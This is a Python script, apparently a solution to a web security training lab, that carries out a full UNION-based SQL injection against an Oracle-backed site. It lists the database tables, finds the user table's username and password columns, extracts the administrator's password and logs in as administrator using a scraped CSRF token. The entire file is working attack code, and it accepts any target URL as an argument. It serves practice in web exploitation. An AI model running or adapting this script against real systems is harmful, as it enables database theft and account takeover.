import urllib3
import sys
import re
import requests
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def extract_users_table(url:str):
    url = url + "/filter?category=Lifestyle' UNION SELECT TABLE_NAME, NULL From all_tables --"
    r = requests.get(url, proxies=proxies, verify=False)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text, 'html.parser')
        users_table = soup.find(string=re.compile('^USERS.*'))
        return users_table
    else:
        return None

def extract_username_password_columns(url:str, users_table:str):
    url = url + "/filter?category=" + f"Lifestyle' UNION SELECT COLUMN_NAME, NULL From all_tab_columns where TABLE_NAME = '{users_table}' --"
    r = requests.get(url, proxies=proxies, verify=False)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text, 'html.parser')
        usernames = soup.find(string=re.compile('.*USERNAME_.*'))
        passwords = soup.find(string=re.compile('.*PASSWORD_.*'))
        return usernames, passwords
    else:
        return None
    
def extract_admin_password(url:str, usernames:str, passwords:str, users_table):
    url = url + "/filter?category=" + f"Lifestyle' UNION SELECT {usernames}, {passwords} From {users_table} -- "
    try:
        r = requests.get(url, proxies=proxies, verify=False)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, 'html.parser')
            password = soup.find(string='administrator').parent.find_next('td').contents[0]
            return password
        else:
            print("Failed to extract password")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def get_csrf(url:str, s:requests.Session):
    try:
        r = s.get(url +'/login', verify=False, proxies=proxies, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {'name':'csrf'})['value']
        return csrf
    except requests.exceptions.RequestException as ex:
        print(f"Error {ex}")
        return None


def login(url:str, s:requests.Session, csrf:str, password:str):
    login_url = url + '/login'
    login_data = {'csrf': csrf, 'username': 'administrator', 'password': password}
    try:
        r = s.post(login_url, login_data, verify=False, proxies=proxies, timeout=5)
        response = r.text
        if 'Log out' in response:
            print("Logged in successfully")
            return True
        else:
            print("Failed to log in")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    users_table = extract_users_table(url)
    if users_table:
        print(f"Found Users table: {users_table}")
    else:
        print("Failed to find users table")
        sys.exit(-1)

    usernames, passwords = extract_username_password_columns(url, users_table)
    if usernames and passwords:
        print(f"Found Usernames column:\n {usernames}\nPasswords:\n{passwords}")
    else:
        print("Could not find columns")
        sys.exit(-1)
    
    admin_password = extract_admin_password(url, usernames, passwords, users_table)
    if admin_password:
        print(f"Found administrator's password: {admin_password}")
        s = requests.Session()
        csrf = get_csrf(url, s)
        if login(url, s, csrf, admin_password):
            print("Lab Solved!")
            sys.exit(0)
        else:
            sys.exit(-1)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()